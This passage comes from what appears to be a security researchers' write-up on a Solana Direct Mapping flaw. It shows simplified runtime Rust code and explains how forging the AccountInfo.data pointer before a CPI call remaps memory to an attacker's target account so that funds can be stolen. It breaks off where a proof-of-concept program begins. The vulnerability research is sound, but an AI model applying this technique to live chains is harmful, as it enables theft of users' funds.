<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span><span></span><span class="token token" style="color:#999">// Vulnerable implementation (simplified)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span><span></span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">update_caller_account</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span>    invoke_context</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">InvokeContext</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span><span>    memory_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">MemoryMapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span>    is_loader_deprecated</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span><span>    caller_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span>    callee_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">BorrowedAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;_</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">32</span><span>    direct_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">33</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">34</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">35</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">36</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> direct_mapping </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span> caller_account</span><span class="token token" style="color:#ccc">.</span><span>original_data_len </span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f08d49">0</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">37</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">38</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> region </span><span class="token token" style="color:#67cdcc">=</span><span> memory_mapping</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">region</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Load</span><span class="token token" style="color:#ccc">,</span><span> caller_account</span><span class="token token" style="color:#ccc">.</span><span>vm_data_addr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">39</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> callee_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_data</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">40</span><span>        </span><span class="token token" style="color:#cc99cd">if</span><span> region</span><span class="token token" style="color:#ccc">.</span><span>host_addr</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">!=</span><span> callee_ptr </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">41</span><span>            region</span><span class="token token" style="color:#ccc">.</span><span>host_addr</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span>callee_ptr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">42</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">43</span><span>    </span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The immediate question is, does the invariant of correct identification of <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> hold?</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The answer is no. Recall <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CallerAccount.vm_data_addr</code> comes directly from <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo.data.as_ptr()</code> in the VM&#x27;s heap memory - memory that programs have complete control over.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">from_account_info</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    invoke_context</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">InvokeContext</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    memory_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryMapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    is_loader_deprecated</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    _vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    account_info</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    original_data_len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#ccc">(</span><span>serialized_data</span><span class="token token" style="color:#ccc">,</span><span> vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span> ref_to_len_in_vm</span><span class="token token" style="color:#ccc">,</span><span> serialized_len_ptr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>        </span><span class="token token" style="color:#999">// Double translate data out of RefCell</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> data </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#f08d49">translate_type</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>            memory_mapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>            account_info</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> _ </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>            invoke_context</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_check_aligned</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span>        </span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>            serialized_data</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span>            vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span><span>            ref_to_len_in_vm</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span><span>            serialized_len_ptr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span><span>        </span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">CallerAccount</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span><span>        vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">32</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">33</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">By manipulating the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountInfo.data</code> pointer in VM memory before triggering a CPI call, an attacker can forge the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_data_addr</code> value. This causes <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">update_caller_account</code> to locate the wrong <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> and update its <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> to point to the attacker&#x27;s target account data, effectively mapping the virtual memory of some <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> to a wrong host memory.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">A Failed Exploit that Led Us Deeper</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Though the primitive seems extremely powerful, the exploitation wasn&#x27;t as smooth as it might seems. After identifying the critical oversight, we started assessing its impact.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Our first intuition is that since virtual memory are mapped incorrectly, it should be possible to bypass the memory write authorization checks, for exmaple, by mapping a writable virtual memory to some account data that should be readonly. This will be sufficient to allow attackers to steal funds by modifying token program accounts. Our first PoC implemented this idea, and it worked on an older version of Direct Mapping.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    ptr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    mem</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#e2777a">rc</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#e2777a">cell</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span></span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span></span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">solana_program</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    </span><span class="token token" style="color:#e2777a">account_info</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>    </span><span class="token token" style="color:#e2777a">instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>        </span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>        </span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>    </span><span class="token token" style="color:#e2777a">program</span><span class="token token" style="color:#ccc">::</span><span>invoke_signed</span><span class="token token" style="color:#ccc">,</span><span>
